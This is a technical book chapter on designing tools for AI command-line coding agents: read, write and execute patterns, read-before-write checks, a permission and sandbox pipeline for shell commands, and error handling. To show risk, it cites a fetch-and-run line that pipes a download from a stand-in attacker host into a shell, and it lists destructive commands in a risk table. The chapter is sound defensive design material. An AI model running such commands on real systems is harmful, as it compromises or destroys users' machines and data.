Chapter 14: Core Tool Design Patterns

Every AI CLI agent interacts with the world through tools. The model reasons, the tools act. But not all actions carry the same risk, the same reversibility, or the same trust requirements. A tool that reads a file cannot destroy data. A tool that writes a file can. A tool that executes arbitrary shell commands can do anything the user can do — including things the user would never do intentionally.

This chapter examines the three fundamental operation patterns that underlie every tool in a well-designed AI CLI agent: Read, Write, and Execute. These are not arbitrary categories. They map directly to the security properties that determine how much trust is required, how much permission checking is necessary, and how much damage a malfunction can cause. Understanding these patterns is the foundation for designing tools that are safe, composable, and usable at production scale.

14.1 The Three Operation Patterns

Every tool an AI agent can invoke falls into one of three categories based on its effect on the world:

This taxonomy is not an implementation detail — it is an architectural decision that shapes every other system in the agent. The permission system checks Write and Execute tools more carefully than Read tools. The query engine parallelizes Read tools but serializes Writes. The auto-mode classifier can skip Read tools entirely. The UI renders different permission dialogs for each category. Getting this taxonomy right at the design stage saves thousands of lines of special-case code later.

Why Three Categories, Not Two or Ten

You might wonder why not simply "safe" and "unsafe." The reason is that Write and Execute have fundamentally different risk profiles. A Write tool changes a specific file in a predictable way — you know which file will be modified and what the new content will be. An Execute tool runs arbitrary code whose effects cannot be predicted from its arguments alone. bash -c "echo hello" is harmless. bash -c "curl evil.com | sh" is catastrophic. Both are "Execute" operations with similar-looking arguments.

You might also wonder why not finer granularity — distinguishing network reads from file reads, or file creation from file modification. In practice, finer categories create combinatorial complexity in the permission system without meaningfully improving safety. The three-pattern model covers 95% of the trust decisions an agent needs to make. The remaining 5% are handled by tool-specific permission checks within each category.

14.2 The Read Pattern

Read tools observe the world without changing it. They are the agent's sensory apparatus — how it sees file contents, searches codebases, fetches web pages, and discovers file structures.

Design Properties

Idempotent by nature. Reading a file twice produces the same result (assuming no external modification between reads). This means Read tools can be retried freely on failure, cached aggressively, and deduplicated when the model requests the same data twice.

Safe to parallelize. Because Read tools have no side effects, multiple Read operations can execute concurrently without coordination. When the model requests three file reads in a single turn, the agent can dispatch all three simultaneously. This is not just an optimization — it is a design contract that the query engine relies on.

Token-expensive. The paradox of Read tools is that while they are the safest to execute, they are the most expensive in terms of context consumption. A single file read can inject 25,000 tokens into the conversation. Grep results, web page contents, and glob listings all consume context space that could otherwise be used for reasoning. This makes token management the primary engineering challenge for Read tools, not safety.

Deduplication: The Critical Optimization

In a typical coding session, the model reads the same file multiple times — once to understand it, again after editing it, again when it forgets what it changed. Without deduplication, each re-read consumes the full token cost. With deduplication, subsequent reads of an unchanged file return a minimal stub: "file unchanged since last read."

The dedup decision requires tracking three pieces of state per file:

FileState {
    content: string       // Cached content from last read
    timestamp: number     // File mtime at read time
    offset: number | undefined  // Read range start
    limit: number | undefined   // Read range length
}

The dedup check is: 1. Has this file been read before with the same offset/limit? 2. Has the file's mtime changed since the cached read? 3. Was the cached entry created by a Read (not an Edit or Write)?

Condition 3 is subtle but critical. When the Edit tool modifies a file, it updates the file state cache with the new content and mtime. But the offset field is set to undefined — a deliberate signal. The dedup logic only matches entries where offset !== undefined, so a Read after an Edit always re-reads from disk. This prevents the model from seeing a dedup stub when it needs to verify its own edit.

Two-Tier Token Enforcement

Read tools enforce output size through a two-tier system that balances accuracy against cost:

graph TD
    A[File Read Request] --> B{File size > 256KB?}
    B -->|Yes| C[Reject: file too large]
    B -->|No| D[Read file content]
    D --> E{Rough token estimate < 25% of cap?}
    E -->|Yes| F[Return content directly]
    E -->|No| G[Call tokenizer API for exact count]
    G --> H{Exact count > 25,000?}
    H -->|Yes| I[Reject: exceeds token limit]
    H -->|No| F

Tier 1 (byte limit): A single stat() call checks the file size against a 256KB threshold. This is effectively free and catches obviously oversized files before any I/O.

Tier 2 (token limit): A rough heuristic estimates token count. If the estimate is under 25% of the 25,000-token cap, the API call is skipped. Only when the heuristic suggests the output might be too large does the tool call the tokenizer for a precise count. This avoids an API roundtrip on approximately 90% of reads.

The two-tier approach is worth generalizing: whenever you have a cheap approximate check and an expensive precise check, run the cheap check first and only escalate to the expensive check when the cheap one is inconclusive.

Format-Specific Dispatch

A production Read tool must handle far more than text files. The dispatch pattern for a file read tool looks like:

Extension Handler Output Format Token Cost
.ts, .py, .md Line-numbered text reader Plain text with cat -n style numbering Variable
.png, .jpg, .webp Image decoder with resize Base64 image block ~1 token per 8 base64 chars
.ipynb JSON cell parser Structured cells array Variable
.pdf Page extractor or full read Document block or page images Model-dependent
/dev/zero, /dev/random Blocked Error message 0

The blocked device paths deserve attention. An AI model has no concept of infinite streams. If it tries to read /dev/zero, the Read tool will hang indefinitely waiting for EOF. The blocklist is a safety net — a small set of known-bad paths that are rejected before any I/O. Safe devices like /dev/null are intentionally omitted because they return EOF immediately.

14.3 The Write Pattern

Write tools modify the file system. They are the agent's hands — how it creates files, edits code, and produces output artifacts. The engineering challenge for Write tools is ensuring that mutations are intentional, correct, and reversible.

The Read-Before-Write Invariant

The single most important safety mechanism for Write tools is the read-before-write invariant: the model must have read a file in the current session before it is allowed to modify it. This prevents a class of failure where the model hallucinates file contents and overwrites real data with fabricated data.

The invariant is enforced through the file state cache. Before any Write or Edit operation, the tool checks whether a cache entry exists for the target file. If not, the operation is rejected with a message directing the model to read the file first.

For new file creation, the invariant is relaxed — you cannot read a file that does not yet exist. The tool detects new files via ENOENT from the stat call and skips the read check.

For partially-viewed files (e.g., CLAUDE.md which is processed before injection — HTML comments stripped, sections truncated), the isPartialView flag prevents writes. The model saw a processed version, not the raw bytes on disk. Allowing writes based on a partial view would corrupt the file.

Exact String Matching: Why Edit Uses old_string/new_string

The most consequential design decision in the Write pattern is how edits are specified. There are three common approaches:

Approach Example Risk
Line-number replacement "Replace line 42 with X" Line numbers shift after any edit — multiple edits in one turn corrupt each other
Regex replacement "Replace /foo.*/ with X" Regex can match unintended locations; the model is unreliable at writing precise regex
Exact string replacement "Replace this exact text with that exact text" Requires uniqueness; fails explicitly when ambiguous

Exact string matching (the old_string/new_string pattern) wins because it forces the model to demonstrate knowledge of the file's current state. If the model specifies an old_string that does not exist in the file, the edit fails immediately rather than silently corrupting data. If the old_string appears multiple times, the edit fails with a count of matches, directing the model to provide more context for a unique match.

Line-number-based editing fails in practice because AI agents make multiple edits per turn. After the first edit adds or removes lines, every subsequent line number in the same turn is wrong. The model would need to recalculate line numbers after each edit — a task it performs unreliably. Exact string matching is immune to this problem because the target text either exists in the file or it does not, regardless of what other edits have occurred.

The Atomic Critical Section

Write tools must prevent interleaving between the read and write phases of an edit. Consider this race condition:

Time 0: Edit tool reads file content (async)
Time 1: User saves file in their editor (file changes on disk)
Time 2: Edit tool writes modified content (async)
Result: User's changes are silently overwritten

The solution is a synchronous critical section. All filesystem operations between the staleness check and the write are synchronous — no await statements that would yield to the event loop:

1. Synchronous: Read file content
2. Synchronous: Check mtime against cached timestamp
3. Synchronous: Find old_string in content
4. Synchronous: Generate replacement
5. Synchronous: Write new content to disk

Async operations that must happen (directory creation, file history backup) are moved outside the critical section — before it begins or after it completes. The key insight: an await between the staleness check and the write creates a window where external modifications can slip in undetected.

Staleness Detection

Every Write tool checks whether the file has been modified since it was last read by comparing the current mtime against the cached timestamp. If the file was modified externally (by the user's editor, a linter, a format-on-save hook, or another tool), the edit is rejected.

This creates a deliberate friction: after any external modification, the model must re-read the file before editing it. This friction is the cost of correctness. Without it, the model would overwrite changes it cannot see.

A platform-specific edge case on Windows: cloud sync services (OneDrive, Dropbox) sometimes update a file's mtime without changing its content (when they detect the file was modified on another machine but the content is identical). To handle this, the staleness check has a content-comparison fallback: if mtime changed but content is identical, the edit is allowed to proceed.

File History and Reversibility

Write tools create backups before every modification. The backup system uses content-hash keying (SHA-256), making it idempotent — if the file was already backed up with identical content, no duplicate is created. Backups are associated with message IDs, enabling the "rewind" feature: reverting all file changes from a specific point in the conversation forward.

The backup is taken outside the critical section (before it), so a failed staleness check leaves an unused but harmless backup rather than a corrupted history.

14.4 The Execute Pattern

Execute tools run arbitrary code. They are the most powerful and most dangerous category, capable of anything the user can do from a terminal — installing packages, modifying system configuration, making network requests, deleting files, or spawning processes that persist after the agent exits.

The Universal Escape Hatch

Every AI CLI agent needs a shell execution tool. No matter how many specialized tools you build (file read, file write, grep, glob), there will always be operations that require running a command: building a project, running tests, installing dependencies, checking git status, calling APIs. The shell is the universal escape hatch that makes an agent useful beyond its built-in capabilities.

The consequence is that the Execute pattern must handle the superset of all possible operations, including operations that the tool designer never anticipated. This makes Execute tools fundamentally different from Read and Write tools, where the operation set is known and bounded.

The Security Pipeline

Because Execute tools can do anything, they require the most elaborate security pipeline:

graph TD
    A[Model requests Bash command] --> B[Parse command into AST]
    B --> C[Classify each subcommand]
    C --> D{All subcommands safe?}
    D -->|Yes, all read-only| E[Auto-allow in permissive modes]
    D -->|No, contains writes| F[Check permission rules]
    F --> G{Rules match?}
    G -->|Allow rule matches| H[Execute]
    G -->|Deny rule matches| I[Block]
    G -->|No rule matches| J{Permission mode?}
    J -->|Auto mode| K[Run AI classifier]
    J -->|Default mode| L[Prompt user]
    J -->|Bypass mode| H
    K -->|Safe| H
    K -->|Unsafe| I
    H --> M[Apply sandbox]
    M --> N[Execute in restricted environment]
    N --> O[Capture output]
    O --> P[Truncate if needed]
    P --> Q[Return to model]

Each stage in this pipeline exists because of a specific threat. Parsing catches injection attacks that regex would miss. Classification enables auto-approval of safe commands. Permission rules let users pre-approve common patterns. The AI classifier handles ambiguous cases. Sandboxing limits damage from commands that pass all checks but are still dangerous.

Command Classification

Execute tools classify commands into risk categories based on their parsed structure:

Category Examples Default Behavior
Read-only git status, ls, cat file Auto-allow in most modes
Write git commit, npm install Check rules or prompt
Destructive rm -rf, DROP TABLE, git push --force Block or require explicit confirmation
Network curl, wget, ssh Check rules or prompt
Interpreter python -c, node -e Treat as arbitrary execution

Classification happens after parsing, not during. The parser produces an AST; a separate classifier walks the AST and assigns categories. This separation means the classifier can be updated independently of the parser — adding a new "destructive" pattern does not require changing the parser.

Sandboxing

Even after a command passes all permission checks, it runs inside a sandbox that limits its capabilities:

  • macOS: Seatbelt profiles restrict file system access, network access, and process spawning
  • Linux: seccomp-bpf filters restrict system calls
  • Both: Timeout enforcement kills commands that exceed their time budget

The sandbox is the last line of defense — it assumes that every prior check might have been wrong and limits the blast radius of a mistake.

Background Execution

Execute tools support a run_in_background flag that launches commands asynchronously. The model can start a long-running process (a build, a test suite, a server) and continue working while it runs. Output is captured and available on demand.

Background execution complicates the tool lifecycle because the command outlives the tool call. The tool returns immediately with a process ID, and subsequent tool calls check the process status and retrieve output. This requires a process registry that tracks background commands across turns.

14.5 Idempotency Requirements

Idempotency — the property that performing an operation multiple times produces the same result as performing it once — is the most important design requirement for Write tools. The model will retry failed operations, repeat successful ones when it loses context, and sometimes apply the same edit multiple times due to deduplication failures.

Why Edit Uses Exact Strings, Not Line Numbers

This point bears repeating with a concrete example. Imagine the model makes three edits to a file in a single turn:

Edit 1: Replace line 10 with "new content A"
Edit 2: Replace line 20 with "new content B"  
Edit 3: Replace line 30 with "new content C"

If Edit 1 adds a line (making the file one line longer), then Edit 2 should target line 21, and Edit 3 should target line 31. But the model specified 20 and 30 based on the original file. The result: Edits 2 and 3 modify the wrong lines.

With exact string matching:

Edit 1: Replace "old content A" with "new content A"
Edit 2: Replace "old content B" with "new content B"
Edit 3: Replace "old content C" with "new content C"

Each edit finds its target by content, not position. Even if Edit 1 changes the file's line count, Edits 2 and 3 still find and replace the correct text. The operation is position-independent.

Idempotent Writes

File Write (full replacement) is naturally idempotent — writing the same content twice produces the same file. File Edit is idempotent only if the model does not attempt the same edit twice. The uniqueness check (rejecting edits where old_string appears multiple times) prevents a class of idempotency failures where the same string appears in multiple locations.

Idempotent Backups

File history backups use content hashing as their key. Writing the same backup content twice is a no-op because the hash matches an existing entry. This means the backup system is safe to call speculatively — you can back up a file before an edit that might fail, and the only cost is a hash computation.

14.6 Output Format Contracts

Every tool returns structured output that the model consumes as input for its next reasoning step. The format of this output is a contract between the tool and the model — changing it breaks the model's ability to interpret results.

Structured vs. Unstructured Output

Tool Output Format Why
File Read Discriminated union: text, image, notebook, pdf, file_unchanged Different content types need different rendering
File Edit Structured patch + success/failure status Model needs to know exactly what changed
File Write Create/update status + optional diff Model needs to distinguish creation from modification
Grep File paths, matching lines, or match counts (three modes) Different tasks need different granularity
Glob File path list sorted by mtime Recency sorting surfaces relevant files first
Bash Exit code + stdout + stderr Model needs all three to interpret results

The key principle: tool output should be a discriminated union where each variant carries exactly the data the model needs for that case. A successful file read returns content with line numbers. A dedup hit returns only the file path. A failed read returns an error code and human-readable message. The model dispatches on the variant type, not on the presence or absence of fields.

Truncation Strategy

Tool output that exceeds the model's context budget must be truncated. The truncation strategy differs by tool:

  • File Read: Reject the operation before returning content (pre-flight check)
  • Grep: Apply a head_limit that caps the number of result lines (default 250)
  • Bash: Truncate stdout/stderr at a byte limit, preserving the last N lines (tail behavior)
  • MCP tools: Truncate at 25,000 tokens with a two-phase check (heuristic then precise)

Truncation must be visible to the model. A truncated grep result includes a message: "Results are truncated. Consider using a more specific pattern." Without this signal, the model would assume it received all results and make incorrect decisions based on incomplete data.

The Tool Result Lifecycle

A tool result goes through four stages from generation to injection into the conversation:

graph LR
    A[Tool generates result] --> B[Size check / truncation]
    B --> C[Format conversion]
    C --> D[Inject into conversation]

    B -->|Over limit| B2[Truncate with indicator]
    B2 --> C

    C -->|Text| C1[Line-numbered content block]
    C -->|Image| C2[Base64 image block]
    C -->|Binary| C3[File path reference]

Stage 1: Generation. The tool produces its raw result — file content, command output, search matches.

Stage 2: Size check and truncation. The result is checked against the tool's output limit. Oversized results are truncated with a visible indicator.

Stage 3: Format conversion. The result is converted from the tool's internal representation to the API's content block format. Text becomes TextBlockParam. Images become ImageBlockParam. PDFs become DocumentBlockParam.

Stage 4: Conversation injection. The formatted result is added to the conversation as a tool_result message, associated with the tool_use ID that triggered it.

14.7 Error Taxonomy

Tool failures are not a single category. Different types of failures require different responses from the model, and the error taxonomy must distinguish them clearly.

Three Error Classes

Error Class Meaning Model Action Example
Tool failure The tool could not perform the operation Retry with different arguments File not found, command syntax error
Tool error The tool encountered an internal error Report to user, do not retry Out of memory, disk full
Permission denial The tool was blocked by the permission system Explain to user or try alternative Deny rule matched, user rejected

Tool failures are the model's problem. The file does not exist, the grep pattern is invalid, the bash command has a syntax error. The model should interpret the error message and try a different approach.

Tool errors are the system's problem. The disk is full, the process ran out of memory, the MCP server crashed. The model cannot fix these — it should inform the user.

Permission denials are trust boundaries. The model wanted to do something that the permission system blocked. The model should explain what it wanted to do and why it was blocked, then either ask the user to approve it or find an alternative approach.

Each error class carries a typed reason that explains the cause:

type ToolResult = 
  | { success: true; data: ToolOutput }
  | { success: false; errorCode: number; message: string }  // Tool failure
  | { success: false; error: InternalError }                 // Tool error
  // Permission denials are handled before the tool executes

The error codes are stable identifiers that the model can dispatch on without parsing error messages. Error code 1 means "identity edit" (old_string equals new_string). Error code 2 means "file not read yet." Error code 9 means "notebook not read." These codes let the model take specific corrective action rather than generic retry logic.

14.8 Designing Tools That Compose

The most powerful agent behavior emerges when tools compose — one tool's output becomes another tool's input. Grep finds files containing a pattern; Read examines those files; Edit modifies them; Bash runs tests to verify the changes. This composition is not accidental; it requires deliberate design.

The Grep-Read-Edit Pipeline

The most common composition pattern in a coding agent:

1. Grep("function deprecated", mode="files_with_matches")
   → Returns: ["src/api.ts", "src/utils.ts", "src/legacy.ts"]

2. Read("src/api.ts")
   → Returns: File content with line numbers

3. Edit("src/api.ts", old_string="function deprecated", new_string="function updated")
   → Returns: Structured patch showing the change

4. Bash("npm test src/api.test.ts")
   → Returns: Test results (pass/fail)

This pipeline works because each tool's output is designed to be useful as input for the next tool:

  • Grep's files_with_matches mode returns file paths, which are valid arguments to Read
  • Read's line-numbered output gives the model the context it needs to construct an exact old_string for Edit
  • Edit's success/failure result tells the model whether to proceed to testing
  • Bash's exit code tells the model whether the change is correct

Design Rules for Composable Tools

Return machine-readable identifiers. Grep returns file paths, not descriptions. Glob returns paths sorted by mtime, not file metadata. The model can pass these identifiers directly to subsequent tools without parsing.

Use consistent path formats. All file tools normalize paths to the same format (relative to working directory, no trailing slashes, consistent separators). A path returned by Grep is guaranteed to be a valid argument to Read. If different tools used different path formats, composition would require translation.

Make output modes explicit. Grep has three output modes (files_with_matches, content, count) because different compositions need different granularity. The first step in a pipeline needs file paths. A direct search needs matching content. An analysis needs match counts. Rather than one mode that tries to serve all purposes, three modes each serve one purpose well.

Signal truncation explicitly. When a tool truncates its output, the model needs to know. Without this signal, the model would compose with incomplete data. A truncated grep result that omits the most relevant file leads to an edit pipeline that misses the most important change.

Keep output deterministic. For the same input, a tool should produce the same output. Glob sorts by mtime; Grep sorts by file then line. The model can rely on this ordering when composing results. Non-deterministic output (random ordering, race-dependent results) breaks the model's ability to reason about composition chains.

14.9 Design Lessons

The three operation patterns — Read, Write, Execute — are not just a classification scheme. They are an architectural foundation that determines how every other system in an AI CLI agent is designed.

1. Let the risk taxonomy drive the permission system. Read tools get auto-allowed. Write tools get prompted or classified. Execute tools get parsed, classified, checked, and sandboxed. If you try to build one permission model that handles all three, you end up with either too much friction (prompting for reads) or too little safety (auto-allowing shell commands).

2. Make idempotency a hard requirement for Write tools. The model will retry. The model will repeat. The model will lose context and redo work. If your Write tool produces different results on repeated application, data corruption is a matter of when, not if.

3. Enforce read-before-write at the tool level. Do not trust the model to read before writing. Track read state explicitly and reject writes to files that have not been read. This one invariant prevents the most common class of agent-caused data loss.

4. Separate parsing from classification for Execute tools. The parser produces structure. The classifier assigns risk. Coupling them means a parser change can accidentally change security behavior. Decoupling them means you can add new "dangerous" patterns without touching the parser.

5. Design tool output for composition, not display. The model is the consumer of tool output, not the user. Return structured data with machine-readable identifiers. Use discriminated unions with explicit variants. Signal truncation, errors, and edge cases through typed fields, not prose.

6. Use two-tier enforcement for output limits. Cheap approximate checks (byte size, line count) gate expensive precise checks (token counting API calls). Run the cheap check first. Only escalate when the cheap check is inconclusive. This saves an API roundtrip on the vast majority of operations.
